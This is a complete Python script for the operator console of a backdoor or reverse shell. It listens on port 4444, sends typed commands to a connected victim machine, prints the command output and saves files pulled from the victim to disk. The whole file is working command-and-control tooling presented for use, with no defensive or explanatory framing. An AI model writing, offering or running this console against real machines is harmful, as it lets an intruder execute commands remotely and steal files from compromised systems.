#!/usr/bin/python3

import socket, json, base64

class Listener: 
    # Basic Listener class
    def __init__(self, address: tuple):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(address)
        listener.listen(0)
        print('[*] Waiting for incoming connections')
        self.connection, address = listener.accept()
        print(f'[+] Got a connection from {str(address)}')

    def reliable_send(self, data):
        # Safety way to send data as json
        json_data = json.dumps(base64.b64encode(json.dumps(data).encode()).decode())
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        # Safety way to receive data as json, until everything income
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(base64.b64decode(json.loads(json_data)).decode())
            except ValueError:
                continue

    def execute_remotely(self, command):
        # Method which sending, receiving data and exiting program
        self.reliable_send(command)
        if command[0] == 'exit':
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, file_path, file_data):
        # Method writing data to file
        with open(file_path, 'wb') as file:
            file.write(base64.b64decode(file_data))
            return '[+] Download successful.'

    def run(self):
        # Method which run everythong - receiving, sendin, executing, etc.
        while True:
            command = input('>> ')
            command = command.split(" ")
            result = self.execute_remotely(command)
            if command[0] == 'download':
                result = self.write_file(command[1], result.encode())
            print(result)

# Example
my_listener = Listener(('127.0.0.1', 4444))
my_listener.run()